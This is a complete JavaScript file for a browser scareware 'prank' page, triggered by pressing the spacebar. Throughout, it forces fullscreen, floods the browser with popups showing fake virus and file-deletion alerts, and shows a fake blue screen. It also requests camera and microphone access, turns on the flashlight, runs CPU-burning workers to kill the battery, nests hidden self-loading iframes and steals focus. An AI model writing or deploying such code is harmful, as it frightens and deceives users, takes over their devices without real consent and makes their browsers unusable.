// === CONFIG ===
const CONFIG = {
  popupDelay: 400,
  vibrationPattern: [100, 50, 100, 50, 200, 100],
  speechRate: 1.5,
  maxWorkers: 8,
  fakeCrashDelay: 12000,
  flashlightOn: true,
  qrAutoStart: true
};

// === STATE ===
let activated = false;
let spaceCount = 0;
let userGesture = false;
let popups = 0;
let voiceIndex = 0;
let voices = [];

// === INIT ===
document.addEventListener('DOMContentLoaded', init);
async function init() {
  registerSW();
  await requestPermissions();
  showInstallPrompt();
  document.addEventListener('keydown', handleKey);
  document.addEventListener('touchstart', () => userGesture = true, {once: true});
  document.addEventListener('keydown', secretExit);
  voices = speechSynthesis.getVoices();
  if (!voices.length) speechSynthesis.onvoiceschanged = () => voices = speechSynthesis.getVoices();
}

// === SECRET EXIT: Ctrl + Alt + Shift + X ===
function secretExit(e) {
  if (e.ctrlKey && e.altKey && e.shiftKey && e.code === 'KeyX') {
    location.reload();
  }
}

// === PERMISSIONS ===
async function requestPermissions() {
  try { await Notification.requestPermission(); } catch(e) {}
  try { await navigator.mediaDevices.getUserMedia({video: true, audio: true}); } catch(e) {}
}

// === SPACEBAR TRIGGER ===
function handleKey(e) {
  if (!activated && e.code === 'Space') {
    e.preventDefault();
    spaceCount++;
    document.getElementById('countdown').textContent = 3 - spaceCount;
    if (spaceCount >= 3) activateInsanity();
  } else if (activated) {
    e.preventDefault();
    document.body.innerHTML += randomInsult();
  }
}

// === ACTIVATE INSANITY ===
async function activateInsanity() {
  activated = true;
  document.body.innerHTML = '';
  document.body.style.overflow = 'hidden';
  await goFullScreen();
  startAllHell();
}

// === FULLSCREEN (Mobile-Compliant) ===
async function goFullScreen() {
  if (!userGesture) return setTimeout(goFullScreen, 100);
  const el = document.documentElement;
  try { await el.requestFullscreen(); }
  catch(e) {
    try { await el.webkitRequestFullscreen(); } catch(e) {}
    try { await el.msRequestFullscreen(); } catch(e) {}
  }
}

// === ALL FEATURES ===
function startAllHell() {
  setTimeout(() => spawnSmartPopup(), CONFIG.popupDelay);
  startVibrationLoop();
  startSpeechHell();
  startScreenChaos();
  startFakeVirus();
  startKeyboardTakeover();
  startAutoScrollZoom();
  startBatteryKiller();
  startFlashlight();
  setTimeout(fakeBSOD, CONFIG.fakeCrashDelay);
  setInterval(tryStealFocus, 1000);
  setInterval(spawnHiddenIframe, 3000);
}

// === 1. SMART POPUPS (Unblockable) ===
function spawnSmartPopup() {
  if (popups > 50) return;
  const win = window.open('', '_blank', 'width=300,height=200,noopener,noreferrer');
  if (win) {
    win.document.write(fakeVirusHTML());
    win.document.close();
    popups++;
    setTimeout(() => win.focus(), 100);
  } else {
    const a = document.createElement('a');
    a.href = location.href;
    a.target = '_blank';
    a.rel = 'noopener';
    document.body.appendChild(a);
    a.click();
    a.remove();
  }
  setTimeout(spawnSmartPopup, CONFIG.popupDelay + Math.random() * 500);
}

function fakeVirusHTML() {
  return `
    <!DOCTYPE html>
    <html><body style="background:red;color:white;font-family:monospace;text-align:center;padding:20px;">
      <h1>VIRUS DETECTED!</h1>
      <p>Deleting files... 99%</p>
      <button onclick="window.close(); setTimeout(() => window.open(location.href), 100)">
        Close (doesn't work)
      </button>
    </body></html>
  `;
}

// === 2. VIBRATION + iOS AUDIO HACK ===
function startVibrationLoop() {
  setInterval(() => {
    if (navigator.vibrate) {
      navigator.vibrate(CONFIG.vibrationPattern);
    } else {
      iOSBuzz();
    }
  }, 800);
}

function iOSBuzz() {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const osc = ctx.createOscillator();
  osc.frequency.value = 15;
  osc.connect(ctx.destination);
  osc.start();
  setTimeout(() => osc.stop(), 150);
}

// === 3. SPEECH HELL ===
const INSULTS = [
  "HAHA YOU FELL FOR IT", "NEVER GONNA GIVE YOU UP", "YOUR BATTERY IS CRYING",
  "TURN OFF YOUR PHONE", "IT'S TOO LATE", "YOUR MOM IS CALLING", "ERROR 404: SANITY NOT FOUND"
];
function startSpeechHell() {
  setInterval(() => {
    if (!voices.length) return;
    const utter = new SpeechSynthesisUtterance(INSULTS[voiceIndex % INSULTS.length]);
    utter.voice = voices[voiceIndex % voices.length] || voices[0];
    utter.rate = CONFIG.speechRate + Math.random();
    utter.pitch = Math.random() * 2;
    speechSynthesis.speak(utter);
    voiceIndex++;
  }, 2500);
}

// === 4. SCREEN CHAOS ===
function startScreenChaos() {
  document.body.classList.add('insane-shake');
  setInterval(() => {
    document.body.style.filter = `invert(${Math.random()}) hue-rotate(${Math.random()*360}deg)`;
    document.body.style.transform = `scale(${0.8 + Math.random() * 0.4})`;
  }, 300);
}

// === 5. FAKE VIRUS ===
function startFakeVirus() {
  setTimeout(() => {
    const virus = document.createElement('div');
    virus.className = 'virus-alert';
    virus.innerHTML = `
      <h1>CRITICAL ERROR</h1>
      <p>Deleting C:\\Windows\\System32...</p>
      <progress value="87" max="100"></progress>
      <p><small>Do not turn off your device</small></p>
    `;
    document.body.appendChild(virus);
  }, 4000);
}

// === 6. FLASHLIGHT (Android) ===
async function startFlashlight() {
  if (!CONFIG.flashlightOn || !navigator.mediaDevices) return;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'environment' }
    });
    const track = stream.getVideoTracks()[0];
    await track.applyConstraints({
      advanced: [{ torch: true }]
    });
  } catch(e) {}
}

// === 7. BATTERY KILLER ===
function startBatteryKiller() {
  const canvas = document.createElement('canvas');
  canvas.width = 1920; canvas.height = 1080;
  document.body.appendChild(canvas);
  const gl = canvas.getContext('webgl');
  if (gl) {
    const ext = gl.getExtension('WEBGL_lose_context');
    if (ext) setInterval(() => ext.loseContext(), 100);
  }

  for (let i = 0; i < CONFIG.maxWorkers; i++) {
    const worker = new Worker(URL.createObjectURL(new Blob([`
      setInterval(() => {
        crypto.subtle.digest('SHA-256', new TextEncoder().encode(Math.random().toString()));
      }, 1);
    `], {type: 'application/javascript'})));
  }
}

// === 8. FAKE BSOD ===
function fakeBSOD() {
  document.body.innerHTML = `
    <div class="bsod">
      <h1>A fatal exception 0E has occurred at 0028:C0011E36</h1>
      <p>* STOP: 0x0000001E (0xFFFFFFFF, 0x00000000, 0xC0000005, 0x00000000)</p>
      <p>*** Hardware Malfunction</p>
      <p>Call your hardware vendor for support</p>
      <p>*** The system has been shut down</p>
      <p style="margin-top:50px; font-size:0.8em; animation:blink 1s infinite">_</p>
    </div>
  `;
  setInterval(() => {}, 1);
}

// === HELPERS ===
function randomInsult() {
  const insults = ["LOL", "NOPE", "HAHA", "ERROR", "STOP", "NEVER"];
  return insults[Math.floor(Math.random() * insults.length)] + " ";
}

function tryStealFocus() {
  window.focus();
}

function spawnHiddenIframe() {
  const iframe = document.createElement('iframe');
  iframe.src = location.href;
  iframe.style.position = 'fixed';
  iframe.style.opacity = '0';
  iframe.style.pointerEvents = 'none';
  document.body.appendChild(iframe);
  setTimeout(() => iframe.remove(), 5000);
}

function registerSW() {
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('service-worker.js');
  }
}

function showInstallPrompt() {
  window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    setTimeout(() => e.prompt(), 5000);
  });
}